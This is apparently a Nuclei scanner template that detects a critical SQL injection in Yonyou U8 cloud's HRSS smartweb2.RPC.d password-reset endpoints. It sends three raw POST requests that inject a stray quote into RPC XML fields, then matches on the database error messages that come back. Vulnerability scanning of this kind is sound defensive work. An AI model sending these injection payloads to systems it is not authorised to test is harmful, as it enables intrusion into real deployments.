id: yonyou-U8-cloud-smartweb2-sqli

info:
  name: 用友 U8 cloud SQL注入
  author: hugh
  severity: critical
  tags: yonyou,sqli,u8-cloud

http:
  - raw:
      - |
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Pragma: no-cache
        Content-Length: 519
        Origin: {{RootURL}}
        Connection: close
        Referer: {{RootURL}}/hrss/rm/RmGetPassWord.jsp

        __type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=
        <rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f><f name="ID"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10009" state="insert"><n><v>9999%27</v><v>9999</v></n></r></rs></data><vps><p name="__profileKeys" type="0">findPwd%3B15b021628b8411d33569071324dc1b37</p></vps></rpc>&1700304270832
      - |
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Pragma: no-cache
        Origin: {{RootURL}}
        Connection: close
        Referer: {{RootURL}}/hrss/rm/RmGetPassWord.jsp

        __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=
        <rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10008" state="insert"><n><v>9999%27</v></n></r></rs></data><vps><p name="__profileKeys">findPwd%3Bea0628e63207097f9d120c565ef9f32b</p></vps></rpc>&1700304427399
      - |
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Pragma: no-cache
        Content-Length: 519
        Origin: {{RootURL}}
        Connection: close
        Referer: {{RootURL}}/hrss/rm/RmGetPassWord.jsp

        __type=updateData&__viewInstanceId=nc.bs.hrss.rm.RmGetBackPassWord~nc.bs.hrss.rm.RmGetBackPassWordViewModel&__xml=
        <rpc transaction="10" method="getBackPassWord"><def><dataset type="Custom" id="dsRegisterForm"><f name="REGISTER_ID"></f><f name="PSNNAME"></f><f name="ID"></f></dataset></def><data><rs dataset="dsRegisterForm"><r id="10010" state="insert"><n><v>1111@qq.com</v><v>9999%27</v><v>9999%27</v></n></r></rs></data><vps><p name="__profileKeys">frmForm%3B5b20a3da21ad2cb66a23daffabb30100</p></vps></rpc>&1700304537616

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "&#23383;&#31526;&#20018; '9999'&#21518;&#30340;&#24341;&#21495;&#19981;&#23436;&#25972;." # 字符串 '9999'' 后的引号不完整。
          - "SQL &#21629;&#20196;&#26410;&#27491;&#30830;&#32467;&#26463;"                             # SQL 语句未正确结束 这个错误信息通常与Oracle数据库
          - "&#8220;9999&#8221;&#38468;&#36817;&#26377;&#35821;&#27861;&#38169;&#35823;&#12290;"       # “9999”附近有语法错误。
